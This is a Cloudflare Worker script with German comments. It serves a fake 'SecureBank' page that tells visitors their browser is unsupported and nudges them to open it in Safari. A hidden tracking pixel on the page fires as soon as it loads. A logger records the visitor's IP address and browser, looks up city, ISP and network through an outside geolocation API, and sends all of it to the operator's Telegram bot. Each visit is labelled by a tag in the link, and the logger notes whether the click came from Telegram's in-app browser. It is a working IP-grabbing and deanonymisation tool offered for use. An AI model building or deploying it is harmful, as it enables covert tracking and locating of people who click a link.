export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // --- TEIL 1: DIE FAKE-WEBSITE ---
    if (url.pathname === "/" || url.pathname === "/leak") {
      const tag = url.searchParams.get('c') || 'default';
      
      const html = `
      <!DOCTYPE html>
      <html lang="de">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Secure Bank Login</title>
          <style>
              * { box-sizing: border-box; margin: 0; padding: 0; }
              body { background-color: #0f172a; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
              .login-box { background: #1e293b; padding: 40px 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 400px; text-align: center; }
              .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #38bdf8; }
              p { font-size: 14px; color: #94a3b8; margin-bottom: 30px; }
              .btn { display: block; width: 100%; padding: 15px; background-color: #38bdf8; color: #0f172a; text-decoration: none; font-weight: bold; font-size: 16px; border-radius: 8px; transition: background 0.2s; }
              .btn:hover { background-color: #0ea5e9; }
          </style>
      </head>
      <body>
          <div class="login-box">
              <div class="logo">SecureBank</div>
              <p>Diese Sitzung wird aus Sicherheitsgründen im aktuellen Browser nicht unterstützt.</p>
              
              <!-- DER TRACKER (Feuert sofort) -->
              <img src="/pixel?c=${tag}" style="display:none;" />

              <!-- DER BUTTON (Zwingt iOS Safari, sich zu öffnen) -->
              <a href="${url.origin}/?c=${tag}&browser=1" class="btn">In Safari öffnen</a>
          </div>
      </body>
      </html>
      `;
      return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }

    // --- TEIL 2: DER LOGGER ---
    if (url.pathname === "/pixel") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "unknown";
      const tag = url.searchParams.get("c") || "unbekannt";
      const t = new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" });

      let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt";
      
      try {
        // Andere API, die zuverlässiger ist
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,as`);
        const data = await res.json();
        if (data.status === "success") {
          loc = `${data.city || '?'}, ${data.country || '?'}`;
          isp = data.isp || "?";
          asn = data.as || "?";
        }
      } catch (e) {}

      if (env.BOT_TOKEN && env.CHAT_ID) {
        const isTelegram = ua.includes("Telegram");
        const source = isTelegram ? "TELEGRAM (In-App)" : "BROWSER (Echt)";
        
        // Dein nackter Text (Tag ist direkt am Anfang)
        const msg = 
          `${tag}\n` +
          `${source}\n` +
          `IP: ${ip}\n` +
          `Ort: ${loc}\n` +
          `Provider: ${isp}\n` +
          `ASN: ${asn}\n` +
          `Zeit: ${t}`;

        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: env.CHAT_ID, text: msg })
          });
        } catch (e) {}
      }

      const gif = Uint8Array.from(atob("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="), c => c.charCodeAt(0));
      return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
    }

    return new Response("404 Not Found", { status: 404 });
  }
};
